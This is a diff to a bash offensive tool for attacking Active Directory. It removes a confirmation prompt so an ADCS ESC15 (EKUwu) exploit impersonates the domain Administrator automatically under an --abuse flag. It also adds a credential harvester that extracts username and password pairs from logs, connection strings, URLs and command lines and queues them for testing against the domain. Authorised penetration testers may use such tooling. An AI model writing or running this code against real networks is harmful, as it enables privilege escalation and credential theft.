@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.19.0"
+readonly VERSION="1.20.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1976,7 +1976,13 @@ _adcs_esc15_exploit() {                  # _adcs_esc15_exploit <ca> <v1tpl> <obo
     local ca="$1" tpl="$2" obo="$3"
     _adcs_setauth
     [[ -z "$_ADCS_SID" ]] && _ADCS_SID="$(_adcs_admin_sid)"
-    confirm "  ESC15: abuse v1 template '$tpl' to impersonate Administrator (EKUwu)?" || return 1
+    # NO interactive re-prompt: --abuse (DO_ABUSE=1) is already the consent gate and
+    # is enforced by BOTH callers (blind path + flagged path). The old `confirm` here
+    # double-gated ONLY this path and silently stalled automated/non-tty runs (the
+    # [y/N] got EOF → skip → "detected but did nothing"). ESC15/EKUwu is a clean,
+    # reliable Administrator impersonation, so under --abuse we just run it — exactly
+    # like every other flagged ESC in _abuse_adcs.
+    info "  ESC15/EKUwu: abusing v1 template '$tpl' to impersonate Administrator…"
 
     # ---- Scenario B: enrollment agent → on-behalf-of (yields a PKINIT cert + hash)
     if [[ -n "$obo" ]]; then
@@ -2355,13 +2361,56 @@ _plausible_secret() {
 harvest_secrets() {
     local label="${1:-text}" text; text=$(cat)
     local -a hits=()
+    local added=0
+
+    # (0) USER↔PASS PAIRS — capture the *associated account*, not just the loose
+    # password. Logs/configs/connection-strings almost always leak both together
+    # (e.g. `BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025"`);
+    # pairing them lets us validate a REAL credential (queue_cred → tested as that
+    # user) instead of blind-spraying the password across every account. Broad
+    # label set + connstring / URL / CLI forms so we recognise the common shapes:
+    #   BindUser/BindPass · User|Username|UID|Login|Account : / =  Password|Pwd|Secret
+    #   User ID=…;Password=…   user=…&pass=…   DOMAIN\user / user@dom (stripped)
+    #   scheme://user:pass@host   -u USER -p PASS   -U USER%PASS   net use … /user:
+    local _uL='(?:bind[ _]?user|user(?:[ _]?id|name)?|uid|login|logon|account|acct|svc[ _]?acct|service[ _]?account|principal|member|/user)'
+    local _pL='(?:bind[ _]?pass(?:word)?|pass(?:word)?|pwd|passwd|secret|credential|api[ _-]?key|token)'
+    local line u p up cu cp
+    while IFS= read -r line; do
+        u=$(printf '%s' "$line" | grep -oiP "${_uL}\s*[:=]\s*[\"']?\K[^\"',;}\s]+" | head -1)
+        p=$(printf '%s' "$line" | grep -oiP "${_pL}\s*[:=]\s*[\"']?\K[^\"',;}\s]+" | head -1)
+        # URL form: scheme://user:pass@host
+        if [[ -z "$u" || -z "$p" ]]; then
+            up=$(printf '%s' "$line" | grep -oiP '://\K[^:/@\s]+:[^@/\s]{4,}(?=@)' | head -1)
+            [[ -n "$up" ]] && { u="${up%%:*}"; p="${up#*:}"; }
+        fi
+        # CLI form: -u USER -p PASS   /   -U USER%PASS
+        if [[ -z "$u" || -z "$p" ]]; then
+            cu=$(printf '%s' "$line" | grep -oiP '(?:^|\s)-[uU]\s+\K\S+' | head -1)
+            cp=$(printf '%s' "$line" | grep -oiP '(?:^|\s)-p\s+\K\S+'    | head -1)
+            if [[ -z "$cu" ]]; then          # -U DOMAIN/USER%PASS (impacket/nxc)
+                up=$(printf '%s' "$line" | grep -oiP '(?:^|\s)-U\s+\K\S+%\S+' | head -1)
+                [[ -n "$up" ]] && { cu="${up%%%*}"; cp="${up#*%}"; }
+            fi
+            [[ -n "$cu" && -n "$cp" ]] && { u="$cu"; p="$cp"; }
+        fi
+        [[ -z "$u" || -z "$p" ]] && continue
+        u="${u##*\\}"; u="${u##*/}"; u="${u%%@*}"      # strip DOMAIN\  user/  @domain
+        _is_valid_identity "$u" || continue
+        _plausible_secret "$p"  || continue
+        loot "★ Credential PAIR harvested from ${label}: ${C_GREEN}${C_BOLD}${u} : ${p}${C_RESET}"
+        add_secret "$p" "harvested pair (user $u) from $label"
+        note_cred_source "${u}:${p}" "harvested cred pair from $label"
+        queue_cred "$u" "$p" "" "harvested cred pair from $label"
+        added=$((added+1))
+    done < <(printf '%s\n' "$text" | grep -iE 'user|login|logon|account|acct|pass|pwd|secret|credential|principal|://|(^|[[:space:]])-[uUpP]([[:space:]]|$)' 2>/dev/null)
+
     # (1) "password/pwd/reset to/set to/secret : X"  →  X
     while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
         printf '%s\n' "$text" | grep -oiP '(password|passwd|pwd|pass(?:word)?|reset to|set to|secret|creds?)\s*(?:is|was|to|[:=])?\s*\K[A-Za-z0-9!@#$%^&*._-]{6,40}' )
     # (2) standalone strong tokens (capped to avoid lockout-spray noise)
     while IFS= read -r s; do [[ -n "$s" ]] && hits+=("$s"); done < <(
         printf '%s\n' "$text" | grep -oP '\b(?=[A-Za-z0-9!@#$%^&*._-]*[A-Z])(?=[A-Za-z0-9!@#$%^&*._-]*[a-z])(?=[A-Za-z0-9!@#$%^&*._-]*[0-9])[A-Za-z0-9!@#$%^&*._-]{8,40}\b' | sort -u | head -8 )
-    local added=0 s
+    local s
     for s in "${hits[@]}"; do
         # filter obvious non-secrets
         [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
